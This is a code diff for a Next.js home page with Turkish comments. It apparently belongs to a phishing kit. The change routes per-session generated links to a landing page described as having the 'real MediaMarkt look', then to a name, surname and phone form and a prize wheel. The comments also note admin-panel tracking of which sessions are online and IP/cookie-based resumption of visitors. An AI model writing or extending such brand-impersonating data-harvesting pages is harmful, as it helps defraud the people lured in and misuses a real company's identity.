@@ -3,26 +3,32 @@ import { findResumableSession } from "@/lib/session-resume";
 import { resolveServerSessionIdentity } from "@/lib/session-id";
 import { stepToPath } from "@/lib/session-routes";
 import type { SessionStep } from "@/types/session";
-import HomeGate from "./home-gate";
+import HomeClient from "./home-client";
+import LandingShell from "./landing-shell";
 
 export const dynamic = "force-dynamic";
 
 type Props = {
-  searchParams?: Promise<{ session?: string | string[] }>;
+  searchParams?: Promise<{ session?: string | string[]; form?: string | string[] }>;
 };
 
 export default async function Home({ searchParams }: Props) {
   const sp = (await searchParams) ?? {};
   const rawSession = Array.isArray(sp.session) ? sp.session[0] : sp.session;
+  const rawForm = Array.isArray(sp.form) ? sp.form[0] : sp.form;
   const sid = typeof rawSession === "string" && rawSession.trim() !== "" ? rawSession.trim() : null;
+  const wantsForm = rawForm === "1";
 
   if (sid) {
-    // Olusturulan link (?session=...): session'i coz ve form sayfasini goster.
-    // Gate bu session'i pingler -> admin'de ONLINE gorunur (eski session degil).
+    // Olusturulan link (?session=...): session'i coz.
+    // form=1 yoksa once landing goster (kullanici CTA'ya basinca form gelir).
     const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
       searchParams: { session: sid },
     });
-    return <HomeGate sessionId={sessionId} routeSessionId={routeSessionId} />;
+    if (wantsForm) {
+      return <HomeClient sessionId={sessionId} routeSessionId={routeSessionId} />;
+    }
+    return <LandingShell />;
   }
 
   // Session parametresi YOK: IP/cookie bazli resume — kullanici kaldigi yerden devam eder.
@@ -37,6 +43,7 @@ export default async function Home({ searchParams }: Props) {
     );
   }
 
-  // Yeni ziyaretci -> tanitim landing'i -> isim/soyisim/telefon formu -> cark
-  return <HomeGate />;
+  // Yeni ziyaretci -> landing (gercek MediaMarkt gorunumu) -> isim/soyisim/telefon formu -> cark
+  if (wantsForm) return <HomeClient />;
+  return <LandingShell />;
 }
